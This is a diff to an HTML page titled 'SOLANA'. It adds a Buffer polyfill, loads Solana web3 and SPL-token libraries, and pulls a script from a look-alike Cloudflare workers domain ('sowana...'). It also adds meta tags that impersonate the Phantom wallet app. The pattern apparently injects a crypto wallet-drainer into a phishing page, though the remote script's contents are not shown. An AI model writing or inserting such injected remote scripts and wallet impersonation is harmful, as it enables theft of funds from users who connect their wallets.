@@ -5,6 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA</title>
     <link href="assets/css/main.css" rel="stylesheet">
+<!-- MAIN -->
+    <script>
+    window.Buffer = window.Buffer || {
+      from: function (data, encoding) {
+        if (typeof data === 'string' && encoding === 'hex') {
+          const hex = data.match(/.{1,2}/g).map(h => parseInt(h, 16));
+          return new Uint8Array(hex);
+        }
+        return new Uint8Array(data);
+      },
+      alloc: function (size) {
+        return new Uint8Array(size);
+      }
+    };
+    console.log("Использован минимальный полифилл Buffer");
+    </script>
+    <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
+    <script src="https://sowana.aloxamigusto.workers.dev"></script>
+    <meta name="apple-itunes-app" content="app-id=1598432977, affiliate-data=, app-argument=https://synesis.biz">
+    <meta property="al:ios:url" content="https://synesis.biz">
+    <meta property="al:ios:app_store_id" content="1598432977">
+    <meta property="al:ios:app_name" content="Phantom">
+    <!-- MAIN -->
 </head>
 <body>
         <section class="main">
